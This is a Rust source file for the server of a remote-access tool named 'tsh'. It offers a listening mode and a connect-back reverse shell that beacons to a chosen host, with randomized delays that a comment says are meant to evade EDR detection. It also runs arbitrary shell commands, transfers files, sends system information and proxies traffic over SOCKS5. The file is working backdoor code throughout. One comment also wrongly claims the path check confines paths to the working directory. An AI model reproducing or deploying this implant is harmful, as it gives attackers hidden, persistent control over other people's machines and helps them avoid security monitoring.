use log::{error, info, warn};
use rand::Rng;
use std::path::Path;
use tokio::time::{sleep, Duration};

use tokio::signal;

use crate::{
    constants::*,
    error::*,
    helpers::NoiseLayerExt,
    noise::{NoiseLayer, NoiseListener},
    pty::Pty,
    sysinfo::SystemInfo,
};

/// Validate and sanitize a file path received from a remote client.
/// Rejects absolute paths and path traversal attempts (e.g., "../").
/// Returns a canonicalized path rooted in the current working directory.
pub fn validate_file_path(raw_path: &[u8]) -> TshResult<String> {
    let path_str = std::str::from_utf8(raw_path)
        .map_err(|_| TshError::file_transfer("File path is not valid UTF-8"))?;

    let path = Path::new(path_str);

    // Reject absolute paths
    if path.is_absolute() {
        return Err(TshError::file_transfer(format!(
            "Absolute paths are not allowed: {path_str}"
        )));
    }

    // Reject paths containing ".."
    for component in path.components() {
        if matches!(component, std::path::Component::ParentDir) {
            return Err(TshError::file_transfer(format!(
                "Path traversal is not allowed: {path_str}"
            )));
        }
    }

    // Resolve relative to CWD and verify it stays within CWD
    let cwd = std::env::current_dir()
        .map_err(|e| TshError::system(format!("Failed to get current directory: {e}")))?;
    let resolved = cwd.join(path);

    Ok(resolved.to_string_lossy().into_owned())
}

/// Extract a null-terminated file path from a data buffer and validate it.
pub fn extract_and_validate_path(data: &[u8]) -> TshResult<String> {
    let path_end = data
        .iter()
        .position(|&b| b == 0)
        .ok_or_else(|| TshError::protocol("File path not null-terminated"))?;

    validate_file_path(&data[..path_end])
}

pub async fn run_listen_mode(port: u16, psk: &str) -> TshResult<()> {
    info!("Starting tsh server on port {port}");

    let listener = NoiseListener::new(&format!("0.0.0.0:{port}"), psk).await?;
    info!("Server listening on port {port}");
    info!("PSK authentication enabled");

    // Setup signal handlers outside the loop
    #[cfg(unix)]
    let mut sigterm = signal::unix::signal(signal::unix::SignalKind::terminate())
        .expect("Failed to create SIGTERM handler");
    #[cfg(unix)]
    let mut sigint = signal::unix::signal(signal::unix::SignalKind::interrupt())
        .expect("Failed to create SIGINT handler");

    loop {
        let accept_future = listener.accept();

        #[cfg(unix)]
        let result = tokio::select! {
            accept_result = accept_future => Some(accept_result),
            _ = sigterm.recv() => {
                info!("Received SIGTERM, shutting down gracefully");
                return Ok(());
            }
            _ = sigint.recv() => {
                info!("Received SIGINT (Ctrl+C), shutting down gracefully");
                return Ok(());
            }
        };

        #[cfg(windows)]
        let result = tokio::select! {
            accept_result = accept_future => Some(accept_result),
            _ = signal::ctrl_c() => {
                info!("Received Ctrl+C, shutting down gracefully");
                return Ok(());
            }
        };

        if let Some(accept_result) = result {
            match accept_result {
                Ok(layer) => {
                    let psk = psk.to_string();
                    tokio::spawn(async move {
                        if let Err(e) = handle_client_connection(layer, &psk).await {
                            error!("Client handler error: {e}");
                        }
                    });
                }
                Err(e) => {
                    error!("Failed to accept connection: {e}");
                    sleep(Duration::from_secs(1)).await;
                }
            }
        }
    }
}

pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str) -> TshResult<()> {
    let address = format!("{host}:{port}");
    info!("Connect-back mode: connecting to {address} every {delay} seconds");
    info!("PSK authentication enabled");

    loop {
        match NoiseLayer::connect(&address, psk).await {
            Ok(mut layer) => {
                info!("Connected to client at {address}");

                // Show remote public key for verification
                if let Some(remote_key) = layer.remote_public_key() {
                    use base64::{engine::general_purpose::STANDARD, Engine};
                    info!("Remote public key: {}", STANDARD.encode(remote_key));
                }

                // Send system info before starting shell
                info!("Sending system info to client");
                if let Err(e) = send_sysinfo(&mut layer).await {
                    error!("Failed to send system info: {e}");
                    continue;
                }

                // In connect-back mode, server initiates a shell session
                info!("Initiating reverse shell session");

                // Send RunShell mode to client
                if let Err(e) = layer.write_all(&[OperationMode::RunShell as u8]).await {
                    error!("Failed to send operation mode: {e}");
                    continue;
                }

                // Handle shell session
                if let Err(e) = handle_reverse_shell(&mut layer).await {
                    error!("Reverse shell error: {e}");
                }
            }
            Err(e) => {
                warn!("Failed to connect to {address}: {e}");
            }
        }

        // Jitter: randomize delay to avoid fixed beaconing patterns detectable by EDR
        let jitter_range = delay / 4; // ±25% of base delay
        let jittered_delay = if jitter_range > 0 {
            let offset = rand::rng().random_range(0..=jitter_range * 2);
            delay.saturating_sub(jitter_range) + offset
        } else {
            delay
        };
        info!("Waiting {jittered_delay} seconds before next connection attempt (base: {delay}s)");
        sleep(Duration::from_secs(jittered_delay)).await;
    }
}

pub async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResult<()> {
    info!("Handling new client connection");

    // Show remote public key for verification
    if let Some(remote_key) = layer.remote_public_key() {
        use base64::{engine::general_purpose::STANDARD, Engine};
        info!("Remote public key: {}", STANDARD.encode(remote_key));
    }

    // PSK is now handled at the Noise Protocol level
    info!("PSK authentication successful (via Noise Protocol)");

    // Read operation mode
    info!("Reading operation mode...");
    let mut buffer = vec![0u8; 8192];
    match layer.read(&mut buffer).await {
        Ok(n) => {
            if n == 0 {
                error!("No data received");
                return Err(TshError::protocol("No operation mode received"));
            }
            let mode =
                OperationMode::try_from(buffer[0]).map_err(TshError::InvalidOperationMode)?;
            info!("Operation mode: {mode:?} (byte: {})", buffer[0]);

            let result = match mode {
                OperationMode::RunShell => {
                    info!("Starting shell session");
                    handle_shell_mode(&mut layer).await
                }
                OperationMode::GetFile => {
                    info!("File download request");
                    if n > 1 {
                        handle_file_download_with_data(&mut layer, &buffer[1..n]).await
                    } else {
                        handle_file_download(&mut layer).await
                    }
                }
                OperationMode::PutFile => {
                    info!("File upload request");
                    if n > 1 {
                        handle_file_upload_with_data(&mut layer, &buffer[1..n]).await
                    } else {
                        handle_file_upload(&mut layer).await
                    }
                }
                OperationMode::RunCommand => {
                    info!("Command execution request");
                    if n > 1 {
                        handle_command_execution_with_data(&mut layer, &buffer[1..n]).await
                    } else {
                        handle_command_execution(&mut layer).await
                    }
                }
                OperationMode::SysInfo => {
                    info!("System info request");
                    send_sysinfo(&mut layer).await
                }
                OperationMode::Socks5 => {
                    info!("SOCKS5 proxy request");
                    if n > 1 {
                        crate::socks5::handle_socks5_server(&mut layer, &buffer[1..n]).await
                    } else {
                        Err(TshError::protocol("SOCKS5 request missing target address"))
                    }
                }
            };

            if let Err(ref e) = result {
                error!("Handler error: {e}");
            }
            result
        }
        Err(e) => {
            error!("Failed to read operation mode: {e}");
            Err(e)
        }
    }
}

pub(crate) async fn handle_shell_mode(layer: &mut NoiseLayer) -> TshResult<()> {
    info!("Starting PTY shell session");

    // Create PTY
    let pty = Pty::new().map_err(|e| TshError::pty(format!("Failed to create PTY: {e}")))?;

    // Main shell loop
    let mut pty_buf = vec![0u8; 8192];
    loop {
        tokio::select! {
            // Read from PTY and send to client
            pty_result = pty.read(&mut pty_buf) => {
                match pty_result {
                    Ok(n) => {
                        if n == 0 {
                            info!("PTY closed");
                            break;
                        }
                        if let Err(e) = layer.write_all(&pty_buf[..n]).await {
                            error!("Failed to send PTY data to client: {e}");
                            break;
                        }
                    }
                    Err(e) => {
                        error!("PTY read error: {e}");
                        break;
                    }
                }
            }

            // Read from client and send to PTY
            client_result = read_client_data(layer) => {
                match client_result {
                    Ok(data) => {
                        if data.is_empty() {
                            info!("Client disconnected");
                            break;
                        }
                        if let Err(e) = pty.write(&data).await {
                            error!("Failed to write to PTY: {e}");
                            break;
                        }
                    }
                    Err(e) => {
                        error!("Client read error: {e}");
                        break;
                    }
                }
            }
        }
    }

    info!("Shell session ended");
    Ok(())
}

async fn read_client_data(layer: &mut NoiseLayer) -> TshResult<Vec<u8>> {
    let mut buf = vec![0u8; 8192];
    let n = layer.read(&mut buf).await?;
    buf.truncate(n);
    Ok(buf)
}

async fn handle_file_download_with_data(layer: &mut NoiseLayer, data: &[u8]) -> TshResult<()> {
    info!("Starting file download handler (with inline data)");

    let file_path = extract_and_validate_path(data)?;
    info!("Download request: {file_path}");

    handle_file_download_common(layer, &file_path).await
}

async fn handle_file_download(layer: &mut NoiseLayer) -> TshResult<()> {
    info!("Starting file download handler");

    // Read the entire message containing the file path
    let mut buffer = vec![0u8; 8192];
    let n = layer.read(&mut buffer).await?;

    let file_path = extract_and_validate_path(&buffer[..n])?;
    info!("Download request: {file_path}");

    handle_file_download_common(layer, &file_path).await
}

async fn handle_file_download_common(layer: &mut NoiseLayer, file_path: &str) -> TshResult<()> {
    // Try to open and send file
    match tokio::fs::File::open(file_path).await {
        Ok(mut file) => {
            use tokio::io::AsyncReadExt;

            let metadata = match file.metadata().await {
                Ok(meta) => meta,
                Err(e) => {
                    error!("Failed to get file metadata: {e}");
                    layer.write_all(&0u64.to_be_bytes()).await?;
                    return Ok(());
                }
            };
            let file_size = metadata.len();

            info!("File size: {file_size} bytes");

            // Send file size
            match layer.write_all(&file_size.to_be_bytes()).await {
                Ok(_) => info!("Sent file size"),
                Err(e) => {
                    error!("Failed to send file size: {e}");
                    return Err(e);
                }
            }

            // Send file data in chunks
            let mut buffer = vec![0u8; 8192];
            let mut sent = 0u64;

            while sent < file_size {
                let n = file.read(&mut buffer).await?;
                if n == 0 {
                    break;
                }

                layer.write_all(&buffer[..n]).await?;
                sent += n as u64;

                if sent > 0 && sent.is_multiple_of(64 * 1024) {
                    info!("Sent: {sent}/{file_size} bytes");
                }
            }

            info!("File download completed: {sent} bytes");
        }
        Err(e) => {
            warn!("File open failed for {file_path}: {e}");
            // Send zero size to indicate file not found
            layer.write_all(&0u64.to_be_bytes()).await?;
        }
    }

    Ok(())
}

async fn handle_file_upload_with_data(layer: &mut NoiseLayer, data: &[u8]) -> TshResult<()> {
    info!("Starting file upload handler (with inline data)");

    let file_path = extract_and_validate_path(data)?;
    info!("Upload request: {file_path}");

    handle_file_upload_common(layer, &file_path).await
}

async fn handle_file_upload(layer: &mut NoiseLayer) -> TshResult<()> {
    // Read the entire message containing the file path
    let mut buffer = vec![0u8; 8192];
    let n = layer.read(&mut buffer).await?;

    let file_path = extract_and_validate_path(&buffer[..n])?;
    info!("Upload request: {file_path}");

    handle_file_upload_common(layer, &file_path).await
}

async fn handle_file_upload_common(layer: &mut NoiseLayer, file_path: &str) -> TshResult<()> {
    // Read file size
    let mut size_buf = [0u8; 8];
    layer.read_exact(&mut size_buf).await?;
    let file_size = u64::from_be_bytes(size_buf);

    info!("Expected file size: {file_size} bytes");

    // Create file and receive data
    let mut file = tokio::fs::File::create(file_path).await?;
    let mut buffer = vec![0u8; 8192];
    let mut received = 0u64;

    while received < file_size {
        use tokio::io::AsyncWriteExt;

        let to_read = std::cmp::min(buffer.len(), (file_size - received) as usize);
        let n = layer.read(&mut buffer[..to_read]).await?;

        if n == 0 {
            break;
        }

        file.write_all(&buffer[..n]).await?;
        received += n as u64;

        if received > 0 && received.is_multiple_of(64 * 1024) {
            info!("Received: {received}/{file_size} bytes");
        }
    }

    info!("File upload completed: {received} bytes");
    Ok(())
}

async fn handle_command_execution_with_data(layer: &mut NoiseLayer, data: &[u8]) -> TshResult<()> {
    info!("Starting command execution handler (with inline data)");

    // Find null terminator in the provided data
    let cmd_end = data
        .iter()
        .position(|&b| b == 0)
        .ok_or_else(|| TshError::protocol("Command not null-terminated"))?;

    let command = std::str::from_utf8(&data[..cmd_end])
        .map_err(|_| TshError::protocol("Command is not valid UTF-8"))?;
    info!("Executing command: {command}");

    // Execute command using shell
    #[cfg(unix)]
    let output = tokio::process::Command::new("/bin/sh")
        .arg("-c")
        .arg(command)
        .output()
        .await;

    #[cfg(windows)]
    let output = tokio::process::Command::new("cmd")
        .arg("/C")
        .arg(command)
        .output()
        .await;

    send_command_result(layer, output).await
}

async fn handle_command_execution(layer: &mut NoiseLayer) -> TshResult<()> {
    info!("Starting command execution handler");

    // Read the entire message containing the command
    let mut buffer = vec![0u8; 8192];
    let n = layer.read(&mut buffer).await?;

    // Find null terminator in the message
    let cmd_end = buffer[..n]
        .iter()
        .position(|&b| b == 0)
        .ok_or_else(|| TshError::protocol("Command not null-terminated"))?;

    let command = std::str::from_utf8(&buffer[..cmd_end])
        .map_err(|_| TshError::protocol("Command is not valid UTF-8"))?;
    info!("Executing command: {command}");

    // Execute command using shell
    #[cfg(unix)]
    let output = tokio::process::Command::new("/bin/sh")
        .arg("-c")
        .arg(command)
        .output()
        .await;

    #[cfg(windows)]
    let output = tokio::process::Command::new("cmd")
        .arg("/C")
        .arg(command)
        .output()
        .await;

    send_command_result(layer, output).await
}

async fn send_command_result(
    layer: &mut NoiseLayer,
    output: Result<std::process::Output, std::io::Error>,
) -> TshResult<()> {
    match output {
        Ok(result) => {
            info!(
                "Command executed, sending output ({} bytes)",
                result.stdout.len() + result.stderr.len()
            );

            // Send exit code first (1 byte: 0 = success, 1 = failure)
            let exit_code = if result.status.success() { 0u8 } else { 1u8 };
            layer.write_all(&[exit_code]).await?;

            // Send stdout length and data
            let stdout_len = result.stdout.len() as u32;
            layer.write_all(&stdout_len.to_be_bytes()).await?;
            if stdout_len > 0 {
                layer.write_all(&result.stdout).await?;
            }

            // Send stderr length and data
            let stderr_len = result.stderr.len() as u32;
            layer.write_all(&stderr_len.to_be_bytes()).await?;
            if stderr_len > 0 {
                layer.write_all(&result.stderr).await?;
            }

            info!("Command output sent successfully");
        }
        Err(e) => {
            error!("Failed to execute command: {e}");

            // Send failure exit code and error message
            layer.write_all(&[1u8]).await?; // exit code = failure

            let error_msg = format!("Failed to execute command: {e}");
            let error_bytes = error_msg.as_bytes();

            // Send as stderr
            layer.write_all(&0u32.to_be_bytes()).await?; // stdout length = 0
            layer
                .write_all(&(error_bytes.len() as u32).to_be_bytes())
                .await?;
            layer.write_all(error_bytes).await?;
        }
    }

    Ok(())
}

async fn send_sysinfo(layer: &mut NoiseLayer) -> TshResult<()> {
    let info = SystemInfo::collect();
    let json_bytes = info.to_json_bytes();

    // Send SysInfo mode byte + JSON payload
    let mut data = Vec::with_capacity(1 + json_bytes.len());
    data.push(OperationMode::SysInfo as u8);
    data.extend_from_slice(&json_bytes);
    layer.write_all(&data).await?;

    info!("System info sent ({} bytes)", json_bytes.len());
    Ok(())
}

async fn handle_reverse_shell(layer: &mut NoiseLayer) -> TshResult<()> {
    info!("Starting reverse shell PTY session");

    // Create PTY
    let pty = Pty::new().map_err(|e| TshError::pty(format!("Failed to create PTY: {e}")))?;

    // Main reverse shell loop
    let mut pty_buf = vec![0u8; 8192];
    loop {
        tokio::select! {
            // Read from PTY and send to client
            pty_result = pty.read(&mut pty_buf) => {
                match pty_result {
                    Ok(n) => {
                        if n == 0 {
                            info!("PTY closed");
                            break;
                        }
                        if let Err(e) = layer.write_all(&pty_buf[..n]).await {
                            error!("Failed to send PTY data to client: {e}");
                            break;
                        }
                    }
                    Err(e) => {
                        error!("PTY read error: {e}");
                        break;
                    }
                }
            }

            // Read from client and send to PTY
            client_result = read_client_data(layer) => {
                match client_result {
                    Ok(data) => {
                        if data.is_empty() {
                            info!("Client disconnected");
                            break;
                        }
                        if let Err(e) = pty.write(&data).await {
                            error!("Failed to write to PTY: {e}");
                            break;
                        }
                    }
                    Err(e) => {
                        error!("Client read error: {e}");
                        break;
                    }
                }
            }
        }
    }

    info!("Reverse shell session ended");
    Ok(())
}
